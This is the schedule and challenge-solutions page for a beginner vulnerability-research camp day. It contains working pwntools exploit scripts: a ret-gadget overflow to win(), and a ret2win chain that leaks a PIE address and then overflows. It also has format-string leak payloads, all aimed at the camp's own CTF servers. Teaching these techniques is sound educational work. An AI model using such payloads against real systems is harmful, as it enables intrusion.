# Day 5 Schedule: Vulnerability Research

| Day | Time                  | Title                                                                 | Instructor |
|-----|------------------------|-----------------------------------------------------------------------|------------------|
| 5   | 09:00-09:15 | Arrival | |
| 5   | 9:30-10:30 | Guest Speaker: Jordan Wiens, Binary Ninja                            |       |
| 5   | 10:30-10:45 | Snack | |
| 5   | 10:45-11:30 | Lesson: Stack Buffer Overflows | TJ     |
| 5   | 11:30-12:00 | Stack Overflow Challenges on spacecadets.ctfd.io | |
| 5   | 12:00-13:00 | Lunch | |
| 5   | 13:00-13:45 | Lesson: Format String Vulnerabilities| TJ       |
| 5   | 13:45-14:15 | Format String Challengeson spacecadets.ctfd.io | |
| 5   | 14:15-14:45 | Activity:  Buzz Lightyear Pwn                         |         |
| 5   | 14:45-15:15 | Awards Cewremony | | 

# Resources

- [Smashing the Stack For Fun and Profit](http://phrack.org/issues/49/14.html)
- [PwnTools](https://docs.pwntools.com/en/stable/)

# Challenge Solutions

## Buffer Overflows

**ranger-1:** change into the ``/root/gencyber/vr/ranger-1`` directory. There is a vulnerable program that suffers a buffer overflow in there named ``ranger-1.c``. Take a look and see if you can discover the vulnerability.  Then run the command ``python3 ranger-1.py`` to connect to a network server that is running a copy of the program. If you succeed in exploiting the vulnerability, it will display the flag. 

```
Welcome Space Cadet, I bet you can't overflow var1 >>> $ CCCCCCCC

Excellent Work Cadet, heres your flag >>> flag{apollo_landing_1969}[*] Got EOF while reading in interactive
```

**ranger-2:** change into the ``/root/gencyber/vr/ranger-2`` directory. There is a vulnerable program that suffers a buffer overflow in there named ``ranger-2.c``. Take a look and see if you can discover the vulnerability.  Then run the command ``python3 ranger-2.py`` to connect to a network server that is running a copy of the program. If you succeed in exploiting the vulnerability, it will display the flag. 

```
Welcome Space Cadet, try to crash my very BBBBad program >>> $ BBBBBBBBBBBBBBBBBBBBBB
flag{mars_rover_2020}

```

**ranger-3:** change into the ``/root/gencyber/vr/ranger-3`` directory. There is a vulnerable program that suffers a buffer overflow in there named ``ranger-3.c``. There is also a compiled version of the program named ``ranger-3.bin``. Take a look and see if you can discover the vulnerability.  Then run the command ``python3 ranger-3.py`` to connect to a network server that is running a copy of the program. You will need to modify this program, slightly. If you succeed in exploiting the vulnerability, it will display the flag. 

solution: 
```python
from pwn import *

e = ELF('./ranger-3.bin')
r = ROP(e)
ret_gadget = r.find_gadget(['ret'])[0]

p=remote("spacecadets-ranger-3.chals.io", 443, ssl=True, sni="spacecadets-ranger-3.chals.io")

buffer = p64(ret_gadget)*19
buffer += p64(e.sym['win'])

p.sendline(buffer)

p.interactive()
```

```
The mission of the Space Cadets is to win() at all costs >>> flag{voyager_probes_1977}[
```

## Format String Vulnerabilities

**cadet-1:** change into the ``/root/gencyber/vr/cadet-1`` directory. There is a vulnerable program that suffers a buffer overflow in there named ``cadet-1.c``. Take a look and see if you can discover the vulnerability.  Then run the command ``python3 cadet-1.py`` to connect to a network server that is running a copy of the program. If you succeed in exploiting the vulnerability, it will display the flag. 

```
Welcome Space Cadet, what is your name >>> $ %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Greetings, (nil).0xb.0x7f557b1e0a7a.0xffffffff.0xffffffff.0x72616d7b67616c66.0x7d7265766f725f73.0x7fffe7569000.0x7fffe7569060.0x7fffe75690e0.0x4.0x4[*] Got
unhex 72616d7b67616c66 | rev
flag{mar#

unhex 7d7265766f725f73 | rev
s_rover}#
```

**cadet-2:** change into the ``/root/gencyber/vr/cadet-2`` directory. There is a vulnerable program that suffers a buffer overflow in there named ``cadet-2.c``. Take a look and see if you can discover the vulnerability.  Then run the command ``python3 cadet-2.py`` to connect to a network server that is running a copy of the program. If you succeed in exploiting the vulnerability, it will display the flag. 

```
<<< Welcome Space Cadet, enjoy my guessing game. You get three tries.
Guess the number I am thinking of >>> $ %d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.%d.
<<< Your guess: 11565616.0.0.16.0.623797285.778315054.1680158308.623797285.778315054.1680158308.623797285.778315054.1680158308.11566336.11566144.1679213473.11566160.1677222208.11566192.1679213838.11566488.11566488.11566352. is incorrect
Guess the number I am thinking of >>> $ %19$d
<<< Your guess: 1677222208 is incorrect
Guess the number I am thinking of >>> $ 1677222208
flag{new_horizons_2006}
```

# Activity: PwnSchool Exercise

**flag 1:** change into the ``/root/gencyber/vr/lightyear`` directory and run the command ``python3 pwnschool.py ``. It will connect you to a server that is running a vulnerable binary. There are four steps to exploiting this binary and the program will walk you through it. See if you can finish the first step and enter the flag. 

pwnschool.py 

```
<<< Enter data: (I have given you a capacity of 16 characters) >>> $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-------------------------------------------------------------------------------
<<< Good job. You broke it, in a good way!
<<< Heres flag1: flag{2_infinity}
```

**flag 2:** complete the next step in the fight against Zurg and earn the next flag.

```
Enter up to 16 bytes of data >>> $ %26$p
<<<< You said 0x7ffcb40d2820
-------------------------------------------------------------------------------
<<< Nice job! You leaked a PIE Address for the function we are in now: 0x55f1af76f710.
<<< The base address of this program is = 0x55f1af76f710 - 0x1710 = 0x55f1af76e000
<<< If you have a leak, you can find a base address
<<< by subtracting an offset of that function from your leak.
<<< A base address can be used to find where a function exists in memory
<<< if we add the offset of a function to a base address, the sum
<<< will be that functions exact value in memory
<<< Heres flag2: flag{star_command}
On to the next challenge
```

**flag 3:** almost there, see if you can drop the next flag by adding the base to the offset

```
<<< Welcome to step 3: calculating a PIE address
<<< Zurg is beginning to take note of you, and he's shaking in his boots!
<<< Since you've discovered the base, here's the offset for win(): 0x231a
<<< Can you use this offset, and the base from before to calculate the address of win?
Enter the PIE address of the win() function >>> $ 0x563c0cc4f31a
```

**flag 4:** drop the final flag by running the ``ret2win`` script

```python
from pwn import *

p = remote("spacecadets-pwnschool.chals.io", 443, ssl=True, sni="spacecadets-pwnschool.chals.io")
p.recvuntil(b'>>> ')
p.sendline(b'1')
p.recvuntil(b'>>> ')

# Overflowing the buffer in Step 1
p.sendline(cyclic(17))
p.recvuntil(b'>>> ')
p.sendline(b'2')
p.recvuntil(b'>>> ')

# Leaking the PIE address in Step 2
p.sendline(b'%26$p')
p.recvuntil(b' = ')
p.recvuntil(b' = ')
leak = int(p.recvline().strip(), 16)
p.recvuntil(b'>>> ')
p.sendline(b'3')
p.recvuntil(b'win(): ')
win_off = int(p.recvline().strip(), 16)

# Calculating win address in Step 3
win = leak + win_off
# Sometimes we need returns to line everything up
ret = win - 1
print(hex(win))
p.recvuntil(b'>>> ')
p.sendline(hex(win))
p.recvuntil(b'>>> ')
p.sendline(b'4')
p.recvuntil(b'>>> ')

# Sending a bunch of returns to line up and overflow, then the address of win.
p.sendline(p64(ret) * 6 + p64(win))

p.interactive()
```

